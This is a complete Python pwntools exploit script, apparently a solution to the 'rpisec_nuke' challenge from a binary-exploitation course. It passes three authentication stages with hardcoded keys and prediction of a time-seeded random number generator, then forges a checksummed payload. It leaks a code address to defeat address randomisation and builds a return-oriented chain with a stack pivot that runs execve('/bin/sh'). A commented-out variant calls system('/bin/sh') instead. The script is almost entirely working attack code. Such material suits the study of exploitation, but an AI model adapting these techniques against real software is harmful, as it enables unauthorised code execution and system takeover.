from pwn import *

HOTZ = 'D3E60C90579EEE92EFD46898A911B0AF'
CROWELL = '4E96E75BD2912E31F3234F6828A4A897'
DOOM = '90357303412EF822CD10E798760491A6'

context.log_level = 'info'

def get_session():
    p.recvuntil('SESSION')
    session = int(p.recv(28)[-11:-1])
    print('Session: %d' % session)
    return session

def one():
    p.sendline('1')
    p.sendline(HOTZ + '\n')
    p.sendlineafter('TO MENU', '')
    print('KEY AUTH one DONE')

def two():
    p.sendline('2')
    p.sendline(CROWELL)
    p.sendline('16')
    p.recvuntil('ENCRYPT:')
    p.sendline('KING CROWELL\x00')
    p.sendlineafter('TO MENU', '')
    print('KEY AUTH two DONE')

def three(seed, session):
    tseed = (seed + session) % 2**32
    r = process(['./rand', str(tseed)])
    prand = r.recv().split()
    challenge = map(lambda x:int(x,16), prand[:16])
    randbuf = map(lambda x:int(x,16), prand[16:])
    send = [challenge[i]^randbuf[i] for i in range(16)]
    p.sendline('3')
    p.sendline(str(session))
    for i in range(4):
        doom = u32(DOOM[8*i:8*i+8].decode('hex'))
        send[5*i] ^= doom
    sendtext = ''.join([p32(ui).encode('hex') for ui in send])
    p.sendline(sendtext)
    p.sendlineafter('TO MENU', '')
    print('KEY AUTH three DONE')

def forgery(code):
    seg, chk = '', 0
    for i in range(0, len(code), 4):
        frag = code[i:i+4].ljust(4, '\x00')
        chk ^= u32(frag)
        seg += frag
    checksum = chk ^ u32('\x00END') ^ 0xdcdc59a9
    payload = seg.ljust(504, '\x00') + p32(checksum) + '\x00'
    return enhex(payload)

def nuke(code):
    hexcode = forgery(code)
    p.sendline('4')
    p.send(hexcode)
    p.sendlineafter('TO MENU', '')
    print('NUKE PROGRAM DONE')

def leak_disarm():
    code = 'I'*128+'OIOIOIOIR'
    nuke(code)
    p.sendline('confirm')
    p.recvuntil('OUTPUT:\n')
    addr = ''
    for _ in range(4):
        p.recvuntil('STATUS: ')
        addr += chr(int(p.recv(12)[-5:], 16))
    return u32(addr)

def renuke(code):
    hexcode = forgery(code)
    p.send(hexcode)
    p.recvuntil('PROGRAMMING COMPLETE\n')
    print('NUKE REPROGRAM DONE')

def craft(string, offset):
    code = 'I' * offset + 'S' + string[0]
    for c in string[1:]:
        code += 'IS' + c
    return code


binary = ELF('rpisec_nuke')

p = process('./rpisec_nuke_patched')
# p = remote('mbe', 31337)

sd = int(time.time())
ses = get_session()

one()
two()
three(sd, ses)

disarm = leak_disarm()
text_base = disarm - binary.symbols['disarm_nuke']
print('text base addr: %s' % hex(text_base))

libc_base = text_base - 0x1e2000
sysaddr = libc_base + 0x40190
shaddr = libc_base + 0x160a24


rop = [
    libc_base + 0x000df916, # mov eax, 0xa; pop ebx; pop esi; pop edi; pop ebp
    0x0,                    # to ebx
    0x0,                    # to esi
    0x0,                    # to edi
    0x0,                    # to ebp
    libc_base + 0x0002e3cb, # pop ecx; pop edx
    0x0,                    # to ecx
    0x0,                    # to edx
    libc_base + 0x000275f2, # inc eax
    text_base + 0x1191,     # pop ebx
    shaddr,                 # /bin/sh
    text_base + 0x1682,     # int 0x80
]
rop.extend([ text_base+0x8a3f for _ in range(30-len(rop)) ])    # nop padding
chain = ''.join(map(p32, rop))
pivot = text_base + 0x2cd4  # mov esp, edx

ropchain = craft(chain, 0)
sp = craft(p32(pivot), 132-119)
payload = ropchain + sp + 'DOOM'
renuke(payload)

# to triger easter egg
# binsh = craft('/bin/sh', 0)
# system = craft(p32(sysaddr), 126)
# payload = binsh + system + 'DOOM'
# renuke(payload)


p.interactive()